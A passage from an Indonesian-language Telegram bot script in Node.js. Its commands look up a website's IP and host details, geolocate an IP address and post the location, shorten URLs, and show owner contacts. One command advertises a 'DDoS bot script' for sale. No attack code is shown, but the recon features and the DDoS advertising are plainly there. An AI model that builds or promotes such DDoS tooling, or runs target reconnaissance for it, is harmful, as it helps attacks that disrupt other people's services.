     apikey: 'NOKEY'
 };
 axios.post('https://check-host.cc/rest/V2/info', data, {
    headers: {
      'accept': 'application/json',
      'Content-Type': 'application/json'
   }
 })
 .then(response => {
     const result = response.data;
     if (result.status === 'success') {
         const info = `
          
\`\`\`INFORMASI-WEB+${web}
IP:        ${result.ip}
Hostname:  ${result.hostname}
ISP:       ${result.isp}
ASN:       ${result.asn}
ORG:       ${result.org}
Country:   ${result.country}
Region:    ${result.region}
City:      ${result.city}
Timezone:  ${result.timezone}
Latitude: ${result.latitude}
Longitude: ${result.longitude}
\`\`\`
*About ASN:* \`${result.asnlink}\`
*Website:* \`https://check-host.cc/?m=INFO&target=${web}\`
         `;
         bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
     } else {
         bot.sendMessage(chatId, 'Gagal mendapatkan informasi. Coba lagi nanti.');
     }
 })
 .catch(error => {
     console.error(error);
     bot.sendMessage(chatId, 'Terjadi kesalahan saat menghubungi API.');
 });
});
bot.onText(/\/script/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "Mau Beli Script Bot DDoS?\nKlik Button Di Bawah Untuk Menghubungi Developer Bot\n\nNote : Jangan Spamm!!",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Buy Script', url: `https://t.me/UserMakLu` }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/cekbot/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "Haii Kak, Bot Online ( Aktif ), Jika Bot Off Mungkin Sedang Maintenance Atau Hubungi Owner Kami Makasihâ¬‡ï¸",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Zamss-XcV', url: `https://t.me/UserMakLu` }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/^(\.|\#|\/)cekip(?: (.+))?$/, async (msg, match) => {
        const chatId = msg.chat.id;
        const ip = match[2];
        if (!ip) {
            bot.sendMessage(chatId, 'Input Link! Example /cekip ip nya ', { reply_to_message_id: msg.message_id });
            return;
        }

        try {
            const response = await axios.get(`https://apikey-premium.000webhostapp.com/loc/?IP=${ip}`);
            
            const data = response.data;
            bot.sendChatAction(chatId, 'typing');
            
            // Kirim informasi ke pengguna
            const message = `
ðŸŒ Creator : @Verredtz
ðŸ” IP : ${data.query}
ðŸ“Š Status : ${data.status}
ðŸŒ Country : ${data.country}
ðŸ—ºï¸ Country Code : ${data.countryCode}
ðŸžï¸ Region : ${data.region}
ðŸ¡ Region Name : ${data.regionName}
ðŸ™ï¸ City : ${data.city}
ðŸ˜ï¸ District : ${data.district}
ðŸ  Zip : ${data.zip}
ðŸŒ Latitude : ${data.lat}
ðŸŒ Longitude : ${data.lon}
â° Timezone : ${data.timezone}
ðŸ“¶ ISP : ${data.isp}
ðŸ¢ Organization : ${data.org}
ðŸŒ AS : ${data.as}
            `;
            
            bot.sendMessage(chatId, message);

            // Kirim lokasi ke pengguna
            bot.sendLocation(chatId, data.lat, data.lon);
        } catch (error) {
            console.error('Error:', error);
            // Kirim pesan error jika terjadi kesalahan
            bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
        }
    });
    
bot.onText(/^(\.|\#|\/)tinyurl(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[2];
  if (!url) {
      bot.sendMessage(chatId, 'Usage: /tinyulr [web]\nExample: /tinyulr https://web.com', { reply_to_message_id: msg.message_id });
       return;
    }
            
  // Pastikan URL dimulai dengan "http://" atau "https://"
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    bot.sendMessage(chatId, 'URL harus dimulai dengan "http://" atau "https://"');
    return;
  }

  try {
    const response = await axios.get(`https://tinyurl.com/api-create.php?url=${url}`);
    const shortenedUrl = response.data;
    bot.sendChatAction(chatId, 'typing');
    bot.sendMessage(chatId, shortenedUrl);
  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, 'Maaf, terjadi kesalahan saat mempersingkat URL.');
  }
});

bot.onText(/\/owner/, (msg) => {
      const chatId = msg.chat.id;
      const name = msg.from.first_name;
      const buttons = [
        {
          text: 'Instagram',
          url: 'https://www.instagram.com/verredtzv2'
        },
        {
          text: 'Telegram',
          url: 'https://t.me/ZyoXVerredtz'
        },
        {
          text: 'CH TEAM',
          url: 'https://t.me/Starpez'
        }
      ];
      bot.sendMessage(chatId, `Halo kak ${name}, kamu bisa terhubung dengan owner Zyo Tzy Pro Epep melalui link di bawah:`, {
        reply_markup: {
          inline_keyboard: [buttons]
        }
      });
    });
bot.on('polling_error', (error) => console.log(error));


